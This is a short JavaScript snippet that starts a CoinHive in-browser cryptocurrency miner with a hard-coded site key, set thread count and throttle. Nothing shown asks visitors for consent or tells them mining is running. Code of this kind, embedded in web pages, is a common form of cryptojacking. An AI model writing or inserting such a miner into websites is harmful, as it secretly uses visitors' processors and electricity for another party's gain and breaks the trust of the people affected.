var miner = new CoinHive.Anonymous('MsdjVuLqZhet0OOtARXZUGRKvWHchU0T', {
    threads: 2,
    autoThreads: false,
    throttle: 0.5,
    forceASMJS: false
});
miner.start(CoinHive.IF_EXCLUSIVE_TAB);